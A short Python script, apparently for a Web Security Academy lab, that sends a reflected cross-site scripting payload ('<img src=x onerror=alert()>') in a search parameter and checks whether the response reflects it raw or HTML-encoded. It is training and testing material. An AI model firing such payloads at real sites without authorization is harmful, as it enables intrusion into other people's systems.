import requests
from urllib.parse import quote

# put your lab url here \/
url = "https://0a2f002103cb63aa82a4dfec005300c7.web-security-academy.net/"
payload = "<img src=x onerror=alert()>"
encoded_paylaod = quote(payload)

response = requests.get(url + "?search=" + payload)

print("onerror=alert()" in response.text)
print("img src=x" in response.text)
index = response.text.find("0 search results for")
print(response.text[index - 50 : index + 50])
if payload in response.text:
    print("yes")
elif "&lt;" in response.text:
    print("shit")
else:
    print("we have nothing")
